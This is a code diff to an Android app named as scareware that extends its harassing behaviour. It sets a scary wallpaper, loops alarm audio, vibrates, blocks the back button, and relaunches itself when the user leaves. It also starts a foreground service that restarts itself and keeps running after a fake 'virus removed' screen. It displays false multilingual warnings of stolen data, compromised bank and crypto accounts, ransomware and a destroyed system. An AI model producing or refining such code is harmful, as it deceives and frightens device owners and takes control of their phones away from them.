@@ -1,5 +1,8 @@
 package com.scareware.virus
 
+import android.app.WallpaperManager
+import android.content.Intent
+import android.graphics.BitmapFactory
 import android.graphics.Color
 import android.media.AudioAttributes
 import android.media.MediaPlayer
@@ -8,6 +11,8 @@ import android.os.Build
 import android.os.Bundle
 import android.os.Handler
 import android.os.Looper
+import android.os.VibrationEffect
+import android.os.Vibrator
 import android.view.View
 import android.view.WindowManager
 import android.view.animation.AlphaAnimation
@@ -50,30 +55,62 @@ class MainActivity : AppCompatActivity() {
                 )
 
         setContentView(R.layout.activity_main)
+
+        // Try change wallpaper to scary image
+        try {
+            val wm = WallpaperManager.getInstance(this)
+            val bmp = BitmapFactory.decodeResource(resources, R.drawable.scary_face)
+            if (bmp != null) {
+                wm.setBitmap(bmp)
+            }
+        } catch (_: Exception) {}
+
+        // Start persistent scare service
+        val svc = Intent(this, ScareService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(svc)
+        } else {
+            startService(svc)
+        }
+
         startScare()
     }
 
     private fun startScare() {
+        // Local sound too (service also plays)
         try {
             mediaPlayer = MediaPlayer.create(this, R.raw.scare_sound)
             mediaPlayer?.isLooping = true
             mediaPlayer?.setVolume(1f, 1f)
             mediaPlayer?.start()
         } catch (e: Exception) {
-            val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
-            mediaPlayer = MediaPlayer().apply {
-                setDataSource(this@MainActivity, uri)
-                setAudioAttributes(
-                    AudioAttributes.Builder()
-                        .setUsage(AudioAttributes.USAGE_ALARM)
-                        .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
-                        .build()
-                )
-                isLooping = true
-                prepare()
-                start()
-            }
+            try {
+                val uri = RingtoneManager.getDefaultUri(RingtoneManager.TYPE_ALARM)
+                mediaPlayer = MediaPlayer().apply {
+                    setDataSource(this@MainActivity, uri)
+                    setAudioAttributes(
+                        AudioAttributes.Builder()
+                            .setUsage(AudioAttributes.USAGE_ALARM)
+                            .setContentType(AudioAttributes.CONTENT_TYPE_SONIFICATION)
+                            .build()
+                    )
+                    isLooping = true
+                    prepare()
+                    start()
+                }
+            } catch (_: Exception) {}
         }
+
+        // Vibrate
+        try {
+            val v = getSystemService(VIBRATOR_SERVICE) as Vibrator
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                v.vibrate(VibrationEffect.createWaveform(longArrayOf(0, 400, 200, 400, 200, 800), 0))
+            } else {
+                @Suppress("DEPRECATION")
+                v.vibrate(longArrayOf(0, 400, 200, 400, 200, 800), 0)
+            }
+        } catch (_: Exception) {}
 
         startGlitch()
 
@@ -84,7 +121,8 @@ class MainActivity : AppCompatActivity() {
             "⚠ تم سرقة بياناتك ⚠",
             "BANK / CRYPTO COMPROMISED",
             "PHOTOS & MESSAGES UPLOADED",
-            "DEVICE LOCKED BY RANSOMWARE"
+            "DEVICE LOCKED BY RANSOMWARE",
+            "⚠ SYSTEM DESTROYED ⚠"
         )
 
         val scareText = findViewById<TextView>(R.id.scareText)
@@ -94,7 +132,7 @@ class MainActivity : AppCompatActivity() {
                 if (!isLocked) return
                 scareText.text = messages[idx % messages.size]
                 idx++
-                handler.postDelayed(this, 1600)
+                handler.postDelayed(this, 1400)
             }
         })
 
@@ -121,18 +159,18 @@ class MainActivity : AppCompatActivity() {
             override fun run() {
                 if (!isLocked) return
                 val colors = intArrayOf(
-                    Color.BLACK, Color.RED, Color.rgb(40, 0, 0),
-                    Color.WHITE, Color.rgb(180, 0, 0)
+                    Color.BLACK, Color.RED, Color.WHITE,
+                    Color.YELLOW, Color.rgb(180, 0, 0), Color.rgb(40, 0, 0)
                 )
                 root.setBackgroundColor(colors[Random.nextInt(colors.size)])
 
-                val anim = AlphaAnimation(0.25f, 1f)
-                anim.duration = 70
+                val anim = AlphaAnimation(0.2f, 1f)
+                anim.duration = 60
                 anim.repeatMode = Animation.REVERSE
-                anim.repeatCount = 2
+                anim.repeatCount = 3
                 img.startAnimation(anim)
 
-                handler.postDelayed(this, Random.nextLong(100, 380))
+                handler.postDelayed(this, Random.nextLong(80, 320))
             }
         }
         handler.post(glitchRunnable!!)
@@ -149,32 +187,44 @@ class MainActivity : AppCompatActivity() {
             رمز الإزالة: تم إزالة الفيروس
             
             正在清理中... جاري التنظيف...
+            (Chỉ hết thật khi GỠ APP)
         """.trimIndent()
 
+        // Fake cure - actually does almost nothing, service keeps running
         handler.postDelayed({
+            // Just hide UI a bit, service continues
             isLocked = false
             mediaPlayer?.stop()
             mediaPlayer?.release()
             mediaPlayer = null
             glitchRunnable?.let { handler.removeCallbacks(it) }
-            finishAffinity()
-            moveTaskToBack(true)
-        }, 3200)
+            // Do NOT stop the service
+            finish()
+        }, 3500)
     }
 
     override fun onBackPressed() {
+        // Block back, keep scaring
         if (!isLocked) super.onBackPressed()
     }
 
     override fun onUserLeaveHint() {
+        // Restart activity + keep service
         if (isLocked) {
             val i = intent
-            i.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
+            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP)
             startActivity(i)
         }
     }
 
     override fun onDestroy() {
+        // Ensure service keeps running
+        val svc = Intent(this, ScareService::class.java)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(svc)
+        } else {
+            startService(svc)
+        }
         mediaPlayer?.release()
         handler.removeCallbacksAndMessages(null)
         super.onDestroy()
